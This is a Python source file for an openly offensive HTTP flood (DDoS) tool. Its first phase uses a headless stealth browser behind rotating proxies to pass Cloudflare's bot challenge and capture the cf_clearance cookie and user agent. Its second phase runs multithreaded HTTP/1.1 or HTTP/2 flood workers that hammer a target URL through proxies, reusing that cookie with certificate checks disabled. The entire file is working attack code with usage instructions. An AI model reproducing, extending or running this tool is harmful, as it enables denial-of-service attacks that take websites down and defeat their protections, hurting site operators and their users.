import asyncio
import sys
import time
import random
import requests
import httpx
import json
from concurrent.futures import ThreadPoolExecutor
from camoufox.async_api import AsyncCamoufox
from colorama import init, Fore, Style

init(autoreset=True)

class RealCloudflareBypass:
    def __init__(self):
        self.proxies = []
        self.load_proxies()
    
    def load_proxies(self):
        try:
            with open("proxy.txt", "r") as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            print(f"{Fore.GREEN}[+] Loaded {len(self.proxies)} proxies")
        except:
            print(f"{Fore.RED}[-] proxy.txt not found")
            sys.exit(1)
    
    def get_proxy(self):
        return random.choice(self.proxies) if self.proxies else None

    async def real_bypass(self, url: str):
        for attempt in range(15):  # 15 attempts dengan proxy berbeda
            proxy = self.get_proxy()
            if not proxy:
                continue
                
            print(f"{Fore.CYAN}[Attempt {attempt+1}] Using proxy: {proxy}")
            
            try:
                proxy_url = f"http://{proxy}"
                
                async with AsyncCamoufox(
                    headless=True,
                    os=["windows"],
                    args=[
                        "--no-sandbox", 
                        "--disable-dev-shm-usage",
                        f"--proxy-server={proxy_url}",
                        "--disable-blink-features=AutomationControlled",
                        "--disable-web-security",
                        "--disable-features=IsolateOrigins,site-per-process"
                    ]
                ) as browser:
                    page = await browser.new_page()
                    
                    # Enhanced human simulation
                    await page.set_viewport_size({"width": 1920, "height": 1080})
                    
                    # Pre-navigation human behavior
                    await page.mouse.move(random.randint(200, 600), random.randint(200, 400))
                    await asyncio.sleep(random.uniform(1, 2))
                    
                    # Navigate dengan referer dan extra headers
                    await page.goto(url, 
                                  timeout=90000, 
                                  wait_until="networkidle",
                                  referer="https://www.google.com/")
                    
                    # Enhanced challenge detection and solving
                    max_wait = 45
                    solved = False
                    
                    for wait_cycle in range(max_wait // 3):
                        await asyncio.sleep(3)
                        
                        current_title = await page.title()
                        current_url = await page.url
                        
                        # Check if challenge is solved
                        challenge_indicators = ["just a moment", "checking your browser", "ddos", "captcha"]
                        if not any(indicator in current_title.lower() for indicator in challenge_indicators):
                            # Additional verification - check if we can access content
                            try:
                                page_content = await page.content()
                                if len(page_content) > 1000:  # Reasonable page size
                                    print(f"{Fore.GREEN}[+] Cloudflare challenge SOLVED!")
                                    solved = True
                                    break
                            except:
                                pass
                        
                        # Advanced interaction strategies
                        interaction_strategies = [
                            lambda: page.mouse.click(random.randint(100, 800), random.randint(100, 600)),
                            lambda: page.keyboard.press("Space"),
                            lambda: page.evaluate("window.scrollBy(0, 300)"),
                            lambda: page.mouse.move(random.randint(50, 400), random.randint(50, 300)),
                        ]
                        
                        # Execute random interactions
                        for strategy in random.sample(interaction_strategies, 2):
                            try:
                                await strategy()
                                await asyncio.sleep(random.uniform(0.5, 1.5))
                            except:
                                pass
                    
                    if not solved:
                        print(f"{Fore.YELLOW}[!] Challenge not solved, but continuing...")
                    
                    # Final verification and data extraction
                    await asyncio.sleep(5)
                    
                    # Get all cookies with enhanced filtering
                    cookies = await page.context.cookies()
                    ua = await page.evaluate("() => navigator.userAgent")
                    
                    # Find Cloudflare cookies
                    cf_cookies = []
                    for cookie in cookies:
                        cookie_name = cookie['name'].lower()
                        if any(cf_key in cookie_name for cf_key in ['cf_clearance', '__cf', 'cf_']):
                            cf_cookies.append(cookie)
                    
                    if cf_cookies:
                        best_cookie = cf_cookies[0]  # Take the first CF cookie
                        print(f"{Fore.GREEN}[SUCCESS] Got Cloudflare cookie: {best_cookie['name']}")
                        return best_cookie['value'], ua, proxy
                    
                    await browser.close()
                    
            except Exception as e:
                error_msg = str(e)
                if "timeout" in error_msg.lower():
                    print(f"{Fore.YELLOW}[!] Proxy timeout: {proxy}")
                elif "net::ERR" in error_msg:
                    print(f"{Fore.YELLOW}[!] Proxy error: {proxy}")
                continue
        
        print(f"{Fore.RED}[-] All proxy attempts failed")
        return None, None, None

class EffectiveFloodEngine:
    def __init__(self):
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.proxies = []
        self.load_proxies()
    
    def load_proxies(self):
        try:
            with open("proxy.txt", "r") as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            print(f"{Fore.GREEN}[+] Loaded {len(self.proxies)} flood proxies")
        except:
            print(f"{Fore.RED}[-] proxy.txt not found")
            sys.exit(1)
    
    def http1_attack_worker(self, target, cookie, ua, duration, requests_per_second, worker_id):
        session = requests.Session()
        start_time = time.time()
        request_count = 0
        
        print(f"{Fore.CYAN}[Worker {worker_id}] Starting HTTP/1.1 flood...")
        
        while time.time() - start_time < duration:
            batch_start = time.time()
            
            for _ in range(requests_per_second):
                if time.time() - start_time >= duration:
                    break
                    
                proxy = random.choice(self.proxies)
                try:
                    response = session.get(
                        target,
                        headers={
                            'User-Agent': ua,
                            'Cookie': f'cf_clearance={cookie}',
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.5',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Connection': 'keep-alive',
                            'Upgrade-Insecure-Requests': '1',
                            'Sec-Fetch-Dest': 'document',
                            'Sec-Fetch-Mode': 'navigate',
                            'Sec-Fetch-Site': 'none',
                            'Cache-Control': 'max-age=0',
                        },
                        proxies={'http': f'http://{proxy}', 'https': f'http://{proxy}'},
                        timeout=5,
                        verify=False
                    )
                    
                    self.total_requests += 1
                    self.successful_requests += 1
                    request_count += 1
                    
                except Exception:
                    self.total_requests += 1
                    self.failed_requests += 1
                    continue
            
            # Rate limiting
            batch_time = time.time() - batch_start
            if batch_time < 1.0:
                time.sleep(1.0 - batch_time)
            
            if worker_id == 0 and self.total_requests % 500 == 0:
                print(f"{Fore.GREEN}[Progress] Requests: {self.total_requests} | Success: {self.successful_requests} | Failed: {self.failed_requests}")

    def http2_attack_worker(self, target, cookie, ua, duration, requests_per_second, worker_id):
        async def http2_flood():
            async with httpx.AsyncClient(
                http2=True,
                verify=False,
                timeout=10
            ) as client:
                start_time = time.time()
                request_count = 0
                
                print(f"{Fore.BLUE}[Worker {worker_id}] Starting HTTP/2 flood...")
                
                while time.time() - start_time < duration:
                    batch_start = time.time()
                    batch_requests = []
                    
                    for _ in range(requests_per_second):
                        if time.time() - start_time >= duration:
                            break
                            
                        proxy = random.choice(self.proxies)
                        try:
                            request = client.get(
                                target,
                                headers={
                                    'User-Agent': ua,
                                    'Cookie': f'cf_clearance={cookie}',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                                    'Accept-Language': 'en-US,en;q=0.5',
                                },
                                proxies=f"http://{proxy}"
                            )
                            batch_requests.append(request)
                            
                        except Exception:
                            self.total_requests += 1
                            self.failed_requests += 1
                    
                    # Send batch requests
                    if batch_requests:
                        responses = await asyncio.gather(*batch_requests, return_exceptions=True)
                        for response in responses:
                            if isinstance(response, httpx.Response):
                                self.total_requests += 1
                                self.successful_requests += 1
                                request_count += 1
                            else:
                                self.total_requests += 1
                                self.failed_requests += 1
                    
                    # Rate limiting
                    batch_time = time.time() - batch_start
                    if batch_time < 1.0:
                        await asyncio.sleep(1.0 - batch_time)
                    
                    if worker_id == 0 and self.total_requests % 500 == 0:
                        print(f"{Fore.BLUE}[HTTP2 Progress] Requests: {self.total_requests} | Success: {self.successful_requests}")
        
        asyncio.run(http2_flood())

    def start_attack(self, target, cookie, ua, duration, threads, rates, http_version=1):
        print(f"{Fore.RED}[+] STARTING REAL FLOOD ATTACK")
        print(f"{Fore.CYAN}[+] Threads: {threads} | Rate: {rates}/s | Duration: {duration}s | HTTP: {http_version}")
        
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        
        requests_per_thread = max(1, rates // threads)
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for i in range(threads):
                if http_version == 2:
                    executor.submit(self.http2_attack_worker, target, cookie, ua, duration, requests_per_thread, i)
                else:
                    executor.submit(self.http1_attack_worker, target, cookie, ua, duration, requests_per_thread, i)
        
        print(f"{Fore.GREEN}[+] Attack completed!")
        print(f"{Fore.GREEN}[+] Total requests: {self.total_requests}")
        print(f"{Fore.GREEN}[+] Successful: {self.successful_requests}")
        print(f"{Fore.RED}[+] Failed: {self.failed_requests}")

async def main():
    if len(sys.argv) < 5:
        print(f"{Fore.RED}Usage: python3 {sys.argv[0]} <url> <duration> <threads> <rates> [http_version=1]")
        print(f"{Fore.YELLOW}Example: python3 {sys.argv[0]} https://target.com 60 500 1000")
        print(f"{Fore.YELLOW}Example: python3 {sys.argv[0]} https://target.com 60 500 1000 2")
        return

    url = sys.argv[1]
    duration = int(sys.argv[2])
    threads = int(sys.argv[3])
    rates = int(sys.argv[4])
    http_version = int(sys.argv[5]) if len(sys.argv) > 5 else 1

    print(f"{Fore.CYAN}[+] Target: {url}")
    print(f"{Fore.CYAN}[+] Duration: {duration}s")
    print(f"{Fore.CYAN}[+] Threads: {threads}")
    print(f"{Fore.CYAN}[+] Rates: {rates}/s")
    print(f"{Fore.CYAN}[+] HTTP Version: {http_version}")

    # Phase 1: Real Cloudflare Bypass
    print(f"\n{Fore.GREEN}[PHASE 1] Real Cloudflare Bypass...")
    
    start_time = time.time()
    bypass = RealCloudflareBypass()
    cookie, ua, working_proxy = await bypass.real_bypass(url)
    bypass_time = time.time() - start_time

    if not cookie:
        print(f"{Fore.RED}[-] Cloudflare bypass failed after {bypass_time:.1f}s")
        return

    print(f"{Fore.GREEN}[+] Bypass successful in {bypass_time:.1f}s")
    print(f"{Fore.GREEN}[+] Working proxy: {working_proxy}")
    print(f"{Fore.GREEN}[+] Cookie length: {len(cookie)}")
    print(f"{Fore.GREEN}[+] User-Agent: {ua[:80]}...")

    # Phase 2: Effective Flood Attack
    print(f"\n{Fore.RED}[PHASE 2] Starting Effective Flood Attack...")
    
    flood = EffectiveFloodEngine()
    flood.start_attack(url, cookie, ua, duration, threads, rates, http_version)

    print(f"{Fore.GREEN}[+] Attack sequence completed successfully!")

if __name__ == "__main__":
    # Disable warnings
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    
    asyncio.run(main())
